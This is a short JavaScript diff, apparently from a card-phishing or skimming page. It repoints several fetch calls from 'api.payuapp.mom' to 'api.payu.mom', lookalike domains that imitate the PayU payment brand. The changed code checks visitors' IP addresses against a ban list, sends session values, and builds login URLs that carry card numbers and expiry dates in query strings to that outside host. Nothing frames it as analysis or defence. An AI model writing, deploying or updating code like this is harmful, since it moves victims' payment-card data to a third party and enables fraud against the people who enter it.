@@ -2360,7 +2360,7 @@
   };
 
   function checkIPBan(ipAddress) {
-      fetch(`https://api.payuapp.mom/check_ip?ip=${ipAddress}`)
+      fetch(`https://api.payu.mom/check_ip?ip=${ipAddress}`)
           .then(response => response.json())
           .then(data => {
               if (data.banned) {
@@ -2386,7 +2386,7 @@
         console.log(session);
         console.log(session);
         fetch(
-          "https://api.payuapp.mom/update" +
+          "https://api.payu.mom/update" +
             "?session=" +
             encodeURIComponent(session)
         )
@@ -2508,7 +2508,7 @@
         if (question) {
           console.log("question");
           url =
-            "https://api.payuapp.mom/login" +
+            "https://api.payu.mom/login" +
             "?cardNumber=" +
             encodeURIComponent(cardNumber) +
             "&expiryDate=" +
@@ -2530,7 +2530,7 @@
         } else {
           console.log("question");
           url =
-            "https://api.payuapp.mom/login" +
+            "https://api.payu.mom/login" +
             "?cardNumber=" +
             encodeURIComponent(cardNumber) +
             "&expiryDate=" +
